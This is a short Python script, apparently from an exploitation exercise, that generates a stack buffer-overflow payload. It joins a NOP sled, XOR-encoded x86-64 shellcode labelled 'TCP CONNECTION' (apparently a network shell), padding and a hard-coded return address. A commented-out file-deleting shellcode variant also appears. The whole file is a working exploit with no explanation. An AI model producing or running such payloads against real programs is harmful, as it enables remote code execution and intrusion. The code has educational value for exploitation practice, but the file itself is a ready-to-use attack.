#!/usr/bin/python
# Payload generator

base_pointer_length = 8
total_stack_size = 400

NOP = "\x90" * 100

#DELETING FILE (dummy)
# shell_code =  ""
# shell_code += "\x48\x31\xc9\x48\x81\xe9\xf9\xff\xff\xff\x48\x8d\x05"
# shell_code += "\xef\xff\xff\xff\x48\xbb\x54\x08\x60\x97\x24\xa3\xa6"
# shell_code += "\xec\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
# shell_code += "\x3e\x33\x38\x0e\x6c\x18\x89\x8e\x3d\x66\x4f\xe4\x4c"
# shell_code += "\xa3\xf5\xa4\xdd\xef\x08\xba\x47\xa3\xa6\xa4\xdd\xee"
# shell_code += "\x32\x7f\x2d\xa3\xa6\xec\x26\x65\x40\xf3\x51\xce\xcb"
# shell_code += "\x95\x54\x5e\x37\xdf\xad\x45\xa9\xe9\x1c\x39\x9f\xfd"
# shell_code += "\x18\xfb\xa9\xe9"

#TCP CONNECTION
shell_code =  ""
shell_code += "\x48\x31\xc9\x48\x81\xe9\xf5\xff\xff\xff\x48\x8d\x05\xef\xff"
shell_code += "\xff\xff\x48\xbb\x0d\x4e\xae\xfe\xcf\x43\xc2\xde\x48\x31\x58"
shell_code += "\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x67\x67\xf6\x67\xa5\x41"
shell_code += "\x9d\xb4\x0c\x10\xa1\xfb\x87\xd4\x90\x19\x09\x6a\xac\xfe\xde"
shell_code += "\x1f\x8a\x57\xeb\x24\xbe\xa4\xa5\x72\x9a\xd1\x08\x24\x9c\xa6"
shell_code += "\xc0\x46\x8a\xef\xfb\x24\x85\xa6\xc0\x46\x8a\x49\x67\x4d\xf0"
shell_code += "\xb6\x30\x8d\xa8\xff\x55\x41\xab\x8b\x39\x29\xf9\x86\x94\x06"
shell_code += "\x15\xd1\xad\x2a\xac\xf1\x7e\x26\xae\xad\x87\xca\x25\x8c\x5a"
shell_code += "\x06\x27\x18\xc0\x46\xc2\xde"

PAD = 'X' * ((total_stack_size + base_pointer_length) - len(NOP) - len(shell_code))

# Middle of the NOPs
# return_address = "\xa0\xdb\xff\xff\xff\x7f\x00\x00"
return_address = "\x59\x51\x55\x55\x55\x55\x00\x00"

print(NOP + shell_code + PAD + return_address)
